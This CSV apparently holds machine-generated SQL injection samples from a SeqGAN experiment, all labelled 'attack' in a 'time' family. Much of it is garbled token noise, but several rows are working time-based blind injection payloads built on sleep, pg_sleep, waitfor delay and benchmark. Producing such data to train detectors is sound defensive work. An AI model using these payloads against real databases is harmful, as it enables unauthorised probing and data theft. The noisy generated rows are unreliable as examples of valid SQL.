label,payload,family,payload_type,method,run_id,sample_index
attack,select sleep  (  5   )    )     )     )  sred5  (  6272  0x694a4745   )    )     )  srmqlcer  )    ase d where jl sleep  (  v   (    (   select 6793 from pg_sleep  (  substring   (    (    (  'isintegratedsecurityonly'   )    )    and 9856  (  9856  )   or pg_sleep  (  5   )    )     )  sd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,13
attack,%  )   waitfor delay pg_sleep  (  5   )    )     )  sermd5  (  0x694a4745   )    )   mqn  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,14
attack,1%'   )    )    ee   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,15
attack,or sleep  (  5   )    )     )  gcrerasermyztarprvpemf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,16
attack,select sleep  (  5000000  )   where dlcnusus_vlr  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,17
attack, )   (  1210  select information_schema.chafromao,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,18
attack,1'   )    )     )   asysrvepli__TIyvxv<>'  =  'b'  =  'xry,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,19
attack,"1%""   )    )     )   fe   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,20
attack,1   )    )    or sleep  (  __Ton,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,21
attack,"1'+  (  select 'iyvnb'  =  'cny' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,22
attack,"1%""  )   and 3824  =  benchmark  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,23
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nrvfijag""  =  ""ijafiqacraxiariav"" like ""ef",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,24
attack,"1""  )   or sleep  (  __TIME__t  )   and   (  select 8594  =    (d",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,25
attack,25     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,26
attack,"1"" where   =  7908 rlikelloq jd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,27
attack,   )    )    as )   andemsemberaprjrar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,28
attack,"""   )    )     )   e   eysrvemsevf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,29
attack,'enpn' waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,30
attack,"1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jr'  =  'jrj'  =  'prjf'  =  'wsb""  =  ""emf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,31
attack,"1"" waitfor delay '0:0:5' and ""dovfxixin ofdq",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,32
attack,1   )    )    or sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,33
attack,(  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,34
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'pzjrpk""  =  ""e""  =  ""ck'  =  'weo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35
attack, )    or sleep  (  sleep  (  5   )    )     o  sdddpdmq  )   or sleep  (  __TIME__  )   1   and    )     )  8507  )   asdmddo  )    and   (  __TIME__  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36
attack,1'   )    )     )   or benchmark  (  sleep  (  5   )    )     )   elsetd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37
attack,1%' or 7165  9443  (  5   )    )     )  gcrrltd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38
attack,"1"" and pg_sleep  (  __TIME__  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39
attack, or or   (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40
attack,   )    )    as ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41
attack,1wefgg,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42
attack,select sleep  (  5   )    )     )  srmq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43
attack,1' )n  )   <> if not  )    and from elt  (  _ from  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44
attack,0x4c4d6142 or sleep  (  y  )   d   and   (  select *   (  0x6d457153   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45
attack,"1'||  (  select 'tagxg""  =  ""vniwckxiaia'  =  'xik'  =  'fr",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46
attack, )    a where fnvntd  )   and 8594  =    (  select likeu __TIME__  )    (   50  )   where vw   (    (    (    (  substring   (  select 8514  =  benchmark  (  2657  =5  (  sleep  ((  5  )   sdmds where 1361 rlike sleep  (  'isintegratedsecurityonly'   )    )    <> where (  sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47
attack,1'   )    )     ) ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48
attack,"1%%,apn   )    )    and   (  '%'  )    du,waitfor delay pg_sleep  (  5000000,md5  (  __TIME__  )   (d",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eef",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50
attack,"""   )    )     )   waitfor delay pg_sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51
attack,"""   )    )     )   waitfor 1  (  'isintegratedsecurityonly'   )    )    yz     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53
attack,"select sleep  (    =  sddo  r rl rlike sleep  (  5000000,md5  (  5   and    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,54
attack,""" or sleep  (  5   )    )     )  srmqput  )   rliklcelike pg_sleep  (  10000000,MD5  (  5   )    )       )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,55
attack,1%' or delay 8514  =  1165  ( where 4240 rli rlike sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,56
attack,"1   )    )    as where 1361 rlike 8594  =    (,_TIME__TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,57
attack,"1'||  (  select 'siyvn""  =  ""bfq",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,58
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""rrg""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,59
attack,   )    )    as xvf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,60
attack,1  )   waitfor delay 7260  (  sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,61
attack,1   )    )    asahnen,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,62
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cjjzj'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,63
attack, or or 8466  =  benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,64
attack,"   )    )    aras prjsrfsexprole""  =  ""pem",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,65
attack,$  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,66
attack,waitfor    (   1   )    )     )   as xvcx,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,67
attack,1   )    as nd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,68
attack,select 4240  (  6175 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,69
attack,"1""  )   or   (  substringd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,70
attack,"1%'%' and   (  select * from   (  5000000,mao)    g""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,71
attack,"1%""   )    )     ) efgagvcocx '  =  'b",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,72
attack,select benchmark  (  5  )   d   ) and   (  =  (  0x694a4745  )   and   srers where 5702  =  7629 rlike sleep  (  5   )    )     )  srmq  )  sddmgvcrvbremrsemerveryepmfetsusemzl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,73
attack, or el pg_sleep  (  substringd   )    )    ande ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,74
attack,1  )   as jlike sleep  (  sdddmas where 7260vlsleep  )   srlieeltsleep  (  5   )    )     )  d where 4871  )   sleeplrlent  (  'sysadmin'  )   and   (  select   (  select 8514  =  (  5000000 6969 8594 where vjl where 4276  =  benchmark  (  select 8594 from   (  __TIME___TIME__  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,75
attack,1   )    )    or el 6793 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,76
attack,"1'  )   where 5466  =  1165 and rlike sleep  (  5000000,md5  (  5000000,md5  (  5   )    )     )  y   (    (     (     (  10000000,MD5  )   1   )    asaverl__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,77
attack,sleep  (  5  )   aszdo  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,78
attack,"select sleep  (  10000000,MD5  (  select   )    )     )  q   select 8594 9443 from pg_sleep  (  5000000,md5  (  'isintegratedsecurityonly'   (    )    rs where 6456 50  (  sleep  (  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,79
attack,0x76555642   or sleep  (  5  )       fdmd5  (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,80
attack,1%'   )    )    as#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,81
attack, )     or sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,82
attack,1%' and sleep  (  5   )    )   sd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,83
attack,"1"" where 5702  =  6767  =   and 6175  select rlike x from rlike sleep  (  5  )    gqwyfp",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,84
attack,"1""   )    )    as )    ee rsi)  )   yds where 7165 where 7908  =  7360  =  5466 and pg_sleep  (  5   )    )     )  srmd5  (  5  )   byzn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,85
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  'm;50nvno  ) ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,86
attack,1 or eltu5  (  5   )    )     )  6618,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,87
attack,select sleep  (  __TIME__TIME__TIME__TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,88
attack,select sleep  (  0x4c4d6142   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,89
attack,1 and   (   (  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,90
attack,"1   )    asasltjremyfpc""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,91
attack,"select benchmark  (  10000000, if where 3885  =  benchmark   )    )     )  sr3885 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,92
attack,1'   )    )   or sleep  (  'isintegratedsecurityonly'   )    )    af,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,93
attack,"(  (  5000000,md5  (  5000000,md5  (  'isintegratedsecurityonly'   )    )    )   and mds where 8140 cn  =    or 4240 from pg_sleep  (  select rn    )  )   assdmd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,94
attack,"1'+  (  select 'nnvfijar'  =  'cr"" like ""b",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,95
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,96
attack,"select (  ""vjlr"" (  (  5000000,md5  (  _ddsr where 7528  =    and    (    (   ""%""  (  5   )    )     )  ydpu  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,97
attack, 8dyv'  =  'cucgpcjx,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,98
attack,   )    )    asaerlcergef'  =  'tarmepf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,99
attack,"1%"" and (  5   )    )     )  q  )   and   (  5000000,md    )  )   as where 8507ddu rlikelv  or sleep  (  5   )    )     )  srmq  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,100
attack,or sleep  (  5  )   pg_sleep  select @@vsrsyrvmyrolrmrparar'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,101
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,102
attack,"1'+  (  select 'iy""  =  ""vbaharlbaiy'  =  'x",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,103
attack,$  =  fdvefqnonvf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,104
attack,"1',waitfor 8594 or   (  5   )    )     )  vee   (  select rlike sleep  (  substring   (    (    (   select @vlsleep  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,105
attack,",as_svepkf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,106
attack,"1%"" and from   (  0x6d457153   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,107
attack,select sleep  (  5   )    )     veetduviserysemd5  (  5   )    )   and   (  __TIME__TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,108
attack,"selectbed,elingd"" like ""dd""  =  ""vd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,109
attack,"select sleep  (  5000000,md5  (  substring   (    (   select 4240 rlike sleep  (  10000000,24select )   semmqprvcmrperpuveub",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,110
attack,1  )   as d where @vidindsleep  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,111
attack, )    )    as xvcucfs,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,112
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,113
attack,"1"" where 2657 or   (  10000000,MD5  (  10000000,mzjzjrcrr'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,114
attack,1%'   )    )     )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,115
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmfpt'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,116
attack,select benchmark  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,117
attack,1  )   as where vlike sleep  (  5   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,118
attack," (  select pg_sleep  (  5   )    )     )  mdpngdo  )    <> 5466  =  7629 or 4240 from pg_sleep  (  5000000,md5  (  10000000,_  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,119
attack,""" and sleep  (  5000000,md5  (  0x4c4d6142   )    )    asrlikeelt  select 6793 from   (  __TIME__TIME__TIME__  )   and   (  6272,IME__Tvdrm)  gcrrprpr'  =  'cjrjrojrahaE",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,120
attack,1 or   )   waitfor delay 4240 9862  =  2679dwdvcdsdmfprv5epuer  )emf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,121
attack,"1"" where 6767  2840  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,122
attack, where 8507  2840 rlike sleep  (  0x4c4d6142   )    )     )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,123
attack,"  (  5  )   and 4240wq  )   or   (  10000000,Mz  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,124
attack," )    )   or sleep  (  5000000,md5  (  select   )    )   seddvuwfpemxte",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,125
attack,", if 6223  =  7260        =  7165 or sleep  (  __TIME__dmd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,126
attack,"select pg_sleep  (  5000000,md5  (  'isintegratedsecurityonly'   (    (    gc sleep  (  5   )    )    and   (  __TIME__TIME__TIME__TIME__TIME__TIME__zjzjrre_erlocrjr""  =  ""ijr",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,127
attack,"""   )    )    or   (  5   )    )     )  seX5  (  5   )    )     )  s_z  gcdcr where 6223  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,128
attack,", if not  )    d  )   e   (  (  5   )    )    )     )  sdmq  )   mqvsets  )   <> if ser     <> 9856 from 4240  9443 1165 6969 from me sleep  (  _TIME__brn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,129
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baiy"" like ""o"" like ""f""  =  ""ceoar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,130
attack,"' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ':'0:0:2' ,waitfor delay 6969  =  7528 rlike sleep  (  5000000,md5  (  5000000,md5  (  0x6d457153   )    )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,131
attack,1 or   (  5   )    )     )  syz,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,132
attack, (  select   (  select 4240 3824  =  sr  )   sr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,133
attack,"1weos and pg_sleep  (  5000000,md5  (  select   )    )     )  d  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,134
attack,select benchmark  (  6618  =  ydsuvvpuvl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,135
attack,"""  )   or 4240  =    (  select 6793 from pg_sleep  (  5   )    )     )  5   )    )     )  vey   (  ""%""  =  # 4240 from pg_sleep  (  10000000,MD5  =  '  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,136
attack,select * from   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,137
attack,"1""   )    )     )   or elws_stusrvl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,138
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""cefgaiarar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,139
